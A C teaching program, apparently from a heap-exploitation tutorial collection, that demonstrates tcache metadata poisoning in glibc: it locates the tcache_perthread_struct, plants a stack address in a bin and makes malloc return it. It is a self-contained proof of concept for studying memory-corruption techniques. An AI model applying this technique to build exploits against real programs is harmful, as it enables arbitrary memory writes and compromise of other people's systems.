#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

// Tcache metadata poisoning attack
// ================================
//
// By controlling the metadata of the tcache an attacker can insert malicious
// pointers into the tcache bins. This pointer then can be easily accessed by
// allocating a chunk of the appropriate size.

// By default there are 64 tcache bins
#define TCACHE_BINS 64
// The header of a heap chunk is 0x10 bytes in size
#define HEADER_SIZE 0x10

// This is the `tcache_perthread_struct` (or the tcache metadata)
struct tcache_metadata {
  uint16_t counts[TCACHE_BINS];
  void *entries[TCACHE_BINS];
};

int main() {
  // Disable buffering
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  uint64_t stack_target = 0x1337;

  puts("This example demonstrates what an attacker can achieve by controlling\n"
       "the metadata chunk of the tcache.\n");
  puts("First we have to allocate a chunk to initialize the stack. This chunk\n"
       "will also serve as the relative offset to calculate the base of the\n"
       "metadata chunk.");
  uint64_t *victim = malloc(0x10);
  printf("Victim chunk is at: %p.\n\n", victim);

  long metadata_size = sizeof(struct tcache_metadata);
  printf("Next we have to calculate the base address of the metadata struct.\n"
         "The metadata struct itself is %#lx bytes in size. Additionally we\n"
         "have to subtract the header of the victim chunk (so an extra 0x10\n"
         "bytes).\n",
         sizeof(struct tcache_metadata));
  struct tcache_metadata *metadata =
      (struct tcache_metadata *)((long)victim - HEADER_SIZE - metadata_size);
  printf("The tcache metadata is located at %p.\n\n", metadata);

  puts("Now we manipulate the metadata struct and insert the target address\n"
       "in a chunk. Here we choose the second tcache bin.\n");
  metadata->counts[1] = 1;
  metadata->entries[1] = &stack_target;

  uint64_t *evil = malloc(0x20);
  printf("Lastly we malloc a chunk of size 0x20, which corresponds to the\n"
         "second tcache bin. The returned pointer is %p.\n",
         evil);
  assert(evil == &stack_target);
}
